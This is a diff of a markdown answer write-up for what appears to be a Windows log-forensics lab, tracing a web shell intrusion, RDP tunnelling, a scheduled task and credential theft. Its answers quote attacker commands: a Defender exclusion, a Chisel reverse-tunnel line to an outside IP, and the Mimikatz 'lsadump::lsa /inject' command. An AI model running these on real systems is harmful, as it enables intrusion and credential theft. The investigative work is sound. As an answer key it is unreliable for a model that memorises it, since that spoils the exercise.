@@ -11,6 +11,31 @@ An attacker exploited a vulnerable web application, uploaded a web shell, execut
 
 ---
 
+# Task 2 – Scenario
+
+Common Event IDs:
+
+| Event ID | Description |
+|----------|-------------|
+| 1102 | Security audit log was cleared |
+| 4624 | Successful logon |
+| 4625 | Failed logon |
+| 4672 | Special privileges assigned to new logon |
+| 4688 | Process creation |
+
+---
+
+## Question 1
+
+### What is the earliest Event ID you see in the Security logs?
+
+**Answer:** `1102`
+
+**Screenshot**
+```md
+![Q1](screenshots/task2-q1.png)
+```
+
 # Task 3 – Initial Access | Web Access Logs
 
 ## Notes
@@ -25,7 +50,7 @@ An attacker exploited a vulnerable web application, uploaded a web shell, execut
 ![Q1](screenshots/task3-q1.png)
 ```
 
-### Q2. Which IP performed an extensive web scan?
+### Q2. Which IP performed an extensive web scan on the HR01-SRV web app?
 **Answer:** `10.10.23.190`
 
 **Screenshot**
@@ -33,7 +58,7 @@ An attacker exploited a vulnerable web application, uploaded a web shell, execut
 ![Q2](screenshots/task3-q2.png)
 ```
 
-### Q3. Uploaded file path?
+### Q3.What is the absolute path to the file that the suspicious IP uploaded?
 **Answer:** `C:\Apache24\htdocs\uploads\search.php`
 
 **Screenshot**
@@ -41,13 +66,8 @@ An attacker exploited a vulnerable web application, uploaded a web shell, execut
 ![Q3](screenshots/task3-q3.png)
 ```
 
-### Q4. Uploaded malware?
+### Q4.Clearly, that's suspicious! What would you call the uploaded malware / backdoor?
 **Answer:** `Web Shell`
-
-**Screenshot**
-```md
-![Q4](screenshots/task3-q4.png)
-```
 
 **Learning Outcomes**
 - Investigated Apache logs
@@ -63,30 +83,26 @@ An attacker exploited a vulnerable web application, uploaded a web shell, execut
 - Event ID 600
 - Script Block Logging (4104)
 
-### Q1. First command?
+### Q1. What was the first command entered by the attacker?
 `whoami`
 
 ```md
 ![Q1](screenshots/task4-q1.png)
 ```
 
-### Q2. Download URL?
+### Q2. What is the full URL of the file that the attacker attempted to download?
 `http://10.10.23.190:8080/httpd-proxy.exe`
 
 ```md
 ![Q2](screenshots/task4-q2.png)
 ```
 
-### Q3. Defender exclusion?
+### Q3. What command was run to exclude the file from Windows Defender?
 ```powershell
 Add-MpPreference -ExclusionPath C:\Apache24
 ```
 
-```md
-![Q3](screenshots/task4-q3.png)
-```
-
-### Q4. Tunnelled service?
+### Q4. Which remote access service was tunnelled using the uploaded binary?
 `RDP`
 
 ```md
@@ -108,28 +124,28 @@ Important Event IDs:
 - 24 Disconnect
 - 25 Reconnect
 
-### Q1.
+### Q1. What is the timestamp of the first suspicious RDP login?
 `2025-01-23 17:00:12`
 
 ```md
-![Q1](screenshots/task5-q1.png)
+![Q1](screenshots/task5.png)
 ```
 
-### Q2.
+### Q2. What user did the attacker breach?
 `HR01-SRV\Administrator`
 
 ```md
-![Q2](screenshots/task5-q2.png)
+![Q2](screenshots/task5.png)
 ```
 
-### Q3.
+### Q3. What IP is shown as the source of the RDP login?
 `10.10.23.190`
 
 ```md
-![Q3](screenshots/task5-q3.png)
+![Q3](screenshots/task5.png)
 ```
 
-### Q4.
+### Q4. What is the timestamp when the attacker disconnected from RDP?
 `2025-01-23 17:16:46`
 
 ```md
@@ -146,28 +162,28 @@ Event IDs:
 -106 Register
 -129 Process Start
 
-### Q1.
+### Q1. What is the name of the suspicious scheduled task?
 `Apache Proxy`
 
 ```md
-![Q1](screenshots/task6-q1.png)
+![Q1](screenshots/task6-q12.png)
 ```
 
-### Q2.
+### Q2. When was the suspicious scheduled task created?
 `2025-01-23 17:05:37`
 
 ```md
-![Q2](screenshots/task6-q2.png)
+![Q2](screenshots/task6-q12.png)
 ```
 
-### Q3.
+### Q3. What is the task's "Trigger" value as shown in Task Scheduler GUI?
 `At system startup`
 
 ```md
 ![Q3](screenshots/task6-q3.png)
 ```
 
-### Q4.
+### Q4. What is the full command line of the malicious task?
 `C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389`
 
 ```md
@@ -184,28 +200,25 @@ Important IDs:
 -1117 Quarantine
 -5007 Configuration Change
 
-### Q1.
+### Q1. What is the threat family ("Name") of the first quarantined file? 
 `VirTool:Win64/Chisel.G`
 
 ```md
 ![Q1](screenshots/task7-q1.png)
 ```
 
-### Q2.
+### Q2. And what is the threat family of the next detected malware?
 `HackTool:Win32/Mimikatz!pz`
 
 ```md
 ![Q2](screenshots/task7-q2.png)
 ```
 
-### Q3.
+### Q3. What is the file name of the downloaded Mimikatz executable?
 `mimi.exe`
 
-```md
-![Q3](screenshots/task7-q3.png)
-```
 
-### Q4.
+### Q4. Finally, which Mimikatz command was used to extract hashes from LSASS memory?
 `lsadump::lsa /inject`
 
 ```md
